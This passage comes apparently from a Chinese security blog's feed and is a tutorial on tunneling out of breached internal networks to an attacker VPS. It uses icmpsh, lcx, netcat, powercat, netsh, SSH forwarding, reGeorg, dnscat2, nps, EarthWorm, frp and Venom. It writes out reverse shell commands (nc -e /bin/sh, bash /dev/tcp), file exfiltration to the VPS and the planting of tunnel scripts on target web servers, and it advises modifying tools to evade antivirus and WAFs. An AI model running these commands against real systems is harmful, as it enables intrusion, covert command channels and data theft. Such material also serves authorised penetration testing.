class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">服务端禁用：</span><br><span class="line">icmp respones  sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1</span><br><span class="line"></span><br><span class="line">运行程序 ：</span><br><span class="line">.&#x2F;run.sh</span><br><span class="line"></span><br><span class="line">输入目标主机IP地址 开启监听：</span><br><span class="line">.&#x2F;icmpsh_m,py  vpsip 边界出网的公网IP</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">在边界机执行：</span><br><span class="line">Imp.exe -t 攻击机ip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><p>还有一种方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">编译 gcc icmpsh-m.c</span><br><span class="line"></span><br><span class="line">VPS开启监听： sudo .&#x2F;a.out</span><br><span class="line"></span><br><span class="line">内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128</span><br></pre></td></tr></table></figure><h2 id="Lcx"><a href="#Lcx" class="headerlink" title="Lcx"></a>Lcx</h2><p>内网端口转发</p><p>老工具了也是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">目标主机：</span><br><span class="line"></span><br><span class="line">lcx.exe -slave vpsip 4444 127.0.0.1 3389</span><br><span class="line"></span><br><span class="line">VPS:</span><br><span class="line"></span><br><span class="line">Lcx --listen 4444 5555</span><br></pre></td></tr></table></figure><h1 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h1><h2 id="瑞士军刀：nc"><a href="#瑞士军刀：nc" class="headerlink" title="瑞士军刀：nc"></a>瑞士军刀：nc</h2><p>nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下</p><p>简单互相传输功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 </span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip 5555</span><br></pre></td></tr></table></figure><p>文件传输功能：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps：</span><br><span class="line"></span><br><span class="line">nc -lp 5555 &gt;1.txt</span><br><span class="line"></span><br><span class="line">目标机器：</span><br><span class="line"></span><br><span class="line">Nc -vn vpsip &lt; xx.txt</span><br></pre></td></tr></table></figure><p>shell的反弹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">正向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444 -e &#x2F;bin&#x2F;sh</span><br><span class="line"></span><br><span class="line">nc  192.168.1.1 4444</span><br><span class="line"></span><br><span class="line">反向连接：</span><br><span class="line"></span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">nc 192.168.1.1 4444 -e &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure><p>注意：windows版本CMD位置</p><p>C:\windows\system32\cmd.exe</p><p>Bash反向shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line">Bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.1&#x2F;4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h2 id="Powercat（powershell版的nc）"><a href="#Powercat（powershell版的nc）" class="headerlink" title="Powercat（powershell版的nc）"></a>Powercat（powershell版的nc）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正向和反向连接：</span><br><span class="line"></span><br><span class="line">powercat -l -p 8080 -e cmd.exe  -v   </span><br><span class="line">nc 192.168.1.1 8080 -vv</span><br><span class="line"></span><br><span class="line">nc -l -p 8080 -vv</span><br><span class="line">powercat -c 192.169.1.1 -p 8080 -e cmd.exe -v</span><br></pre></td></tr></table></figure><p>可以反弹powershell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-eq</span><br></pre></td></tr></table></figure><p><strong>文件上传</strong></p><p>这个不用说，基本这种连接的都支持</p><p>在<code>c:</code>下新建一个<code>test.txt</code>的文件，写入数据</p><p>在有<code>text.txt</code>的机器执行:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 192.168.12.108 -p 9999 -i c:test.txt -v</span><br></pre></td></tr></table></figure><p>另一台机器执行</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 9999 -of c:test.txt -v</span><br></pre></td></tr></table></figure><h2 id="推荐：netsh端口转发（window平台）"><a href="#推荐：netsh端口转发（window平台）" class="headerlink" title="推荐：netsh端口转发（window平台）"></a>推荐：netsh端口转发（window平台）</h2><p>netsh仅支持TCP协议， 适用于<strong>双网卡</strong>服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">查看系统防火墙状态</span><br><span class="line">netsh firewall show state   </span><br><span class="line"></span><br><span class="line">查看现有规则</span><br><span class="line">netsh interface portproxy show all   </span><br><span class="line"></span><br><span class="line">添加转发规则</span><br><span class="line">listenaddress – 等待连接的本地IP地址</span><br><span class="line">listenport – 本地侦听TCP端口</span><br><span class="line">connectaddress – 将传入连接重定向到本地或远程IP地址（或DNS名称）</span><br><span class="line"></span><br><span class="line">netsh interface portproxy set v4tov4 listenaddress&#x3D;边界机 listenport&#x3D;6666 connectaddress&#x3D;内网IP connectport&#x3D;3389</span><br><span class="line"></span><br><span class="line">#连接边界机6666端口，就是连接到内网目标上面的3389</span><br><span class="line"></span><br><span class="line">使用netstat确保6666端口当前处于被侦听状态：</span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line">删除转发规则</span><br><span class="line">netsh interface portproxy delete v4tov4 listenport&#x3D;6666</span><br></pre></td></tr></table></figure><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><h2 id="SSH转发："><a href="#SSH转发：" class="headerlink" title="SSH转发："></a>SSH转发：</h2><p>一个正常的SSH命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="SSH-本地转发机制："><a href="#SSH-本地转发机制：" class="headerlink" title="SSH 本地转发机制："></a>SSH 本地转发机制：</h2><p>拓扑：</p><p>VPS—-边界WEB—-目标主机</p><p>边界WEB双网卡192.168.1.1和10.1.1.1段</p><p>本地转发机制：</p><p>选项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-C 压缩传输</span><br><span class="line">-f 后台启用</span><br><span class="line">-N 不打开远程shell，处于等待状态</span><br><span class="line">-g 允许本地转发端口</span><br></pre></td></tr></table></figure><p>使用方法：</p><p><strong>在VPS上运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH 边界机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#VPS检查---查看端口是否已经连接</span><br><span class="line">netstat -tulnp | grep &quot;5555&quot;</span><br></pre></td></tr></table></figure><p>当访问 VPS 5555 端口的时候，就转发给 root@192.168.1.1 边界机 ，发送给目标主机</p><h2 id="SSH-远程转发机制："><a href="#SSH-远程转发机制：" class="headerlink" title="SSH 远程转发机制："></a>SSH 远程转发机制：</h2><p>拓扑：</p><p>VPS—-边界WEB—-目标主机</p><p>边界WEB—-目标主机—都是单网卡，都是纯内网 10.1.1.1段</p><p><strong>在WEB边界机运行</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R &lt;vps port&gt;:&lt;目标主机 host&gt;:&lt;目标主机 port&gt; &lt;SSH VPS主机&gt;</span><br><span class="line"></span><br><span class="line">ssh  -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102</span><br></pre></td></tr></table></figure><p>边界机把内网的端口，远程连接道VPS，远程转发道VPS</p><h2 id="SSH-动态转发机制："><a href="#SSH-动态转发机制：" class="headerlink" title="SSH 动态转发机制："></a>SSH 动态转发机制：</h2><p>这里主要是建立一个动态的socks代理隧道</p><p>在VPS上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7000 &lt;SSH 边界主机&gt;</span><br><span class="line">ssh -CfNg -D 7000 root@192.168.1.1</span><br></pre></td></tr></table></figure><p>VPS上7000端口上，开了一个socks代理，用代理软件就可以连接</p><h2 id="HTTP-HTTPS协议隧道"><a href="#HTTP-HTTPS协议隧道" class="headerlink" title="HTTP HTTPS协议隧道"></a>HTTP HTTPS协议隧道</h2><ol><li>reGeorg：</li></ol><p>将对应的脚本文件上传到目标服务器，根据不同的网站类型php jsp asp等，上传对应的脚本 reGeorg.php</p><p>攻击机(VPS)运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -l 46.46.46.46（VPS的IP） -p 666（VPS端口） -u http:&#x2F;&#x2F;（目标服务器IP）&#x2F;reGeorg.php</span><br></pre></td></tr></table></figure><p>然后在本地通过代理工具链接本地的666，就是链接好隧道了</p><p>注意：这个查杀比较严重，建议会免杀的修改修改。</p><p>非常遗憾的是，目前大部分<code>WAF</code>都会针对默认原装版本的<code>reGeorg</code> 。（可以自己修改后使用）</p><p>2.Neo-reGeorg</p><p>这里推荐用 Neo-reGeorg 这个也不错，是重构reGeorg 的一个作品</p><p><a href="https://github.com/L-codes/Neo-reGeorg" target="_blank" rel="noopener">https://github.com/L-codes/Neo-reGeorg</a></p><p>用法类似：</p><p>VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py generate -k &lt;you_password&gt; --file 404.html</span><br></pre></td></tr></table></figure><p>将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。</p><p>VPS上运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python neoreg.py -k &lt;you_password&gt; -u &lt;server_url&gt; --proxy socks5:&#x2F;&#x2F;10.1.1.1:8080（本地代理地址）</span><br></pre></td></tr></table></figure><p>Socks连接工具连接本地127.0.0.1:1080</p><h2 id="DNS-隧道："><a href="#DNS-隧道：" class="headerlink" title="DNS 隧道："></a>DNS 隧道：</h2><p>dnscat2</p><p>工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台</p><p>dnscat2分为两个部分：客户端和服务器。</p><p>服务端为<code>Ruby</code>编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：</p><p>服务端VPS：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装依赖：</span><br><span class="line">apt install gem</span><br><span class="line">apt install ruby-dev</span><br><span class="line">apt install libpq-dev</span><br><span class="line">apt install ruby-bundler</span><br><span class="line"></span><br><span class="line">下载并安装：</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.git</span><br><span class="line">cd dnscat2&#x2F;server</span><br><span class="line">sudo gem install bundler</span><br><span class="line"></span><br><span class="line">开启服务：</span><br><span class="line">ruby .&#x2F;dnscat2.rb vpn.zeo.com -e open</span><br></pre></td></tr></table></figure><p>目标主机客户端：</p><p>上传dnsClient.zip 到目标主机 解压</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;dnscat --dns server&#x3D;服务端ip,port&#x3D;53 --secret&#x3D;服务端生成的秘钥</span><br></pre></td></tr></table></figure><p>直连模式使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS中 server路径下：</span><br><span class="line">ruby .&#x2F;dnscat2</span><br><span class="line"></span><br><span class="line">客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）</span><br><span class="line">.&#x2F;dnscat --dns server&#x3D;x.x.x.x,port&#x3D;53 --secret&#x3D;281fc7a7ec57d500d269c96b8ae36ba5</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/202005061043407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用命令： </span><br><span class="line">window -i 1 进入交互 </span><br><span class="line">exec -c &quot;ping baidu.com&quot; 执行命令， 无回显 </span><br><span class="line">shell 返回一个半交互shell,会有一个id，记录此id </span><br><span class="line">ctrl+Z 返回</span><br></pre></td></tr></table></figure><h2 id="Socks代理："><a href="#Socks代理：" class="headerlink" title="Socks代理："></a>Socks代理：</h2><p>下面基本上都是可以支持多种协议，之介绍scoks的情况，大家可以自己查看使用方法</p><p>也推荐使用这些工具</p><p><strong>nps：</strong> <a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener">https://github.com/ehang-io/nps</a></p><p>**ew：**<a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p><p><strong>frp：</strong> <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><h2 id="推荐使用"><a href="#推荐使用" class="headerlink" title="推荐使用"></a>推荐使用</h2><h2 id="Nps"><a href="#Nps" class="headerlink" title="Nps"></a>Nps</h2><p>nps是一款轻量级、高性能、功能强大的<strong>内网穿透</strong>代理服务器。</p><p>(<a href="https://github.com/ehang-io/nps\" target="_blank" rel="noopener">https://github.com/ehang-io/nps\</a>)</p><p>优点：</p><ul><li>协议支持全面，兼容几乎所有常用协议，例如tcp、udp、http(s)、socks5、p2p、http代理…</li><li>全平台兼容(linux、windows、macos、群辉等)，支持一键安装为系统服务</li><li>操作简单，只需简单的配置即可在web ui上完成其余操作</li><li>展示信息全面，流量、系统信息、即时带宽、客户端版本等</li><li>扩展功能强大，该有的都有了（缓存、压缩、加密、流量限制、带宽限制、端口复用等等）</li></ul><p>环境说明:</p><p>kali边界机: 192.168.5.123 192.168.3.2<br>kali2: 192.168.5.128 攻击者vps机器<br>win7:192.168.3.99 内网机器</p><p>1 启动服务端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim .&#x2F;conf&#x2F;nps.conf</span><br><span class="line">cd ..</span><br><span class="line">.&#x2F;nps. #启动服务</span><br></pre></td></tr></table></figure><p>在服务端配置conf/nps.conf文件，修改用户名密码，端口号后启动服务,最好不要和已有的端口冲突</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">默认端口</span><br><span class="line">nps默认配置文件使用了80，443，8080，8024端口</span><br><span class="line"></span><br><span class="line">80与443端口为域名解析模式默认端口</span><br><span class="line"></span><br><span class="line">8080为web管理访问端口</span><br><span class="line"></span><br><span class="line">8024为网桥端口，用于客户端与服务器通信</span><br><span class="line"></span><br><span class="line">以上都可以在服务端配置conf&#x2F;nps.conf 自行修改</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506104408292.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt=""></p><p>直接访问自己设计的web端口 <a href="http://IP:8081/login/index" target="_blank" rel="noopener">http://IP:8081/login/index</a></p><p>友好的操作界面！</p><p><img src="https://img-blog.csdnimg.cn/20200506104440491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 新增一个客户端，在配置中填写socks代理的密码</p><p><img src="https://img-blog.csdnimg.cn/20200506104524136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>3 记住唯一验证密钥和ID，连接使用</p><p><img src="https://img-blog.csdnimg.cn/20200506104547485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>4 客户端连接，上传npc到边界机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npc.exe -server&#x3D;服务端ip:8024 -vkey&#x3D;生成的vkey -type&#x3D;tcp</span><br></pre></td></tr></table></figure><p>成功上线，点击隧道配置代理</p><p><img src="https://img-blog.csdnimg.cn/20200506104606195.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>新建隧道，协议很全</p><p><img src="https://img-blog.csdnimg.cn/20200506104619902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="[(img-KVfWBLv0-1588732919232)(/Users/zy/Documents/文档文件/学习笔记/内网/内网隧道技术.assets/image-20200430111407478.png)]"><br>这个界面十分友好，就不继续介绍，基本看一眼就会用了。</p><h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><p>EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，可以用于多层的内网穿透</p><p>多层内网穿透可以去GitHub查找</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VPS开启监听：</span><br><span class="line">.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024</span><br><span class="line"></span><br><span class="line">边界机执行：</span><br><span class="line">ew_for_Win.exe -s rssocks -d 攻击Ip -e 1024</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200506104758900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>多层内网二层网络，A无外网 IP–vps 流量转发 +B 正向代理 +A作为跳板端口绑定</p><p>VPS–边界机（可以出网）–内网机（目标网络内部主机，无法访问公网）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">VPS:</span><br><span class="line">.&#x2F;ew -s lcx_listen -l 1080 -e 8888</span><br><span class="line">边界机器:</span><br><span class="line">ew -s lcx_slave -d VPS_IP -e 666 -f 内网主机 -g 9999</span><br><span class="line">内网:</span><br><span class="line">ew -s sscoksd -l 9999</span><br></pre></td></tr></table></figure><p>VPS将1080的代理请求转发到8888</p><p>在边界机上，通过工具的 lcx_slave 方式，打通VPS:8888 和 内网机:9999 之间的通讯隧道</p><p>在内网主机上利用 ssocksd 方式启动 9999 代理</p><p>我们是可通过访问VPS:1080 来使用内网主机提供的 socks5 代理</p><h2 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h2><ul><li>frp 是一个可用于内网穿透的高性能的反向代理应用</li><li>支持 tcp, udp 协议，为 http 和 https</li></ul><p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p><p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p><p>首先在vps上启动frp服务端,开启一个端口，默认是7000：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;frps -c frps.ini</span><br></pre></td></tr></table></figure><p>再配置frp的客户端：</p><ol><li>修改 frpc.ini 文件，假设 frps 所在服务器的公网 IP 为 x.x.x.x：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; x.x.x.x</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[socks5] </span><br><span class="line">type &#x3D; tcp </span><br><span class="line">remote_port &#x3D; 8881 </span><br><span class="line">plugin &#x3D; socks5 </span><br><span class="line">plugin_user &#x3D; root </span><br><span class="line">plugin_passwd &#x3D; root </span><br><span class="line">use_encryption &#x3D; true </span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>注意：上面的配置了用户名密码 root root 代理的时候注意要加上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最后两个配置是</span><br><span class="line">use_encryption &#x3D; true \\启用加密</span><br><span class="line">use_compression &#x3D; true  \\启用压缩</span><br></pre></td></tr></table></figure><p>启动 frpc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><p>最后，使用代理软件连接服务端的8881建立连接</p><h2 id="Venom"><a href="#Venom" class="headerlink" title="Venom"></a>Venom</h2><p>Venom是一款为渗透测试人员设计的使用Go开发的多级代理工具</p><p>admin节点和agent节点均可监听连接也可发起连接,可以互相的连接。</p><p>admin监听端口，agent发起连接:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;admin_linux_x64 -lport 8838</span><br><span class="line"></span><br><span class="line">agent.exe -rhost VPS_IP -rport 8838</span><br></pre></td></tr></table></figure><p>连接成功后出现交互界面 admin node help一下看到功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">help                                     Help information.</span><br><span class="line">exit                                     Exit.</span><br><span class="line">show                                     Display network topology.</span><br><span class="line">getdes                                   View description of the target node.</span><br><span class="line">setdes     [info]                        Add a description to the target node.</span><br><span class="line">goto       [id]                          Select id as the target node.</span><br><span class="line">listen     [lport]                       Listen on a port on the target node.</span><br><span class="line">connect    [rhost] [rport]               Connect to a new node through the target node.</span><br><span class="line">sshconnect [user@ip:port] [dport]        Connect to a new node through ssh tunnel.</span><br><span class="line">shell                                    Start an interactive shell on the target node.</span><br><span class="line">upload     [local_file]  [remote_file]   Upload files to the target node.</span><br><span class="line">download   [remote_file]  [local_file]   Download files from the target node.</span><br><span class="line">socks      [lport]                       Start a socks5 server.</span><br><span class="line">lforward   [lhost] [sport] [dport]       Forward a local sport to a remote dport.</span><br><span class="line">rforward   [rhost] [sport] [dport]       Forward a remote sport to a local dport.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先show 看下拓扑</span><br><span class="line">goto 1  #选择目标1</span><br><span class="line">socks 8886  #在vps上 8886端口上开启代理</span><br></pre></td></tr></table></figure><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MDkxMDM3NDgucG5n?x-oss-process=image/format,png" alt="image-20200509103748389"></p><p>有意思的是这个还能出一个shell，也挺方便</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA1MDkxMDQ0MTYucG5n?x-oss-process=image/format,png" alt="image-20200509104416202"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>内网穿透的东西还是比较重要的，内网断网机常常都得用隧道，所以小结一下，选择的时候最好要有较好的稳定性，支持多种协议，流量可加密，推荐使用最后推荐的几种工具，如果只是端口转发推荐netsh和SSH转发较为稳定。</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>google hack搜索引擎常用总结</title>
      <link href="/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2020/04/26/google%20hack%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E5%B8%B8%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
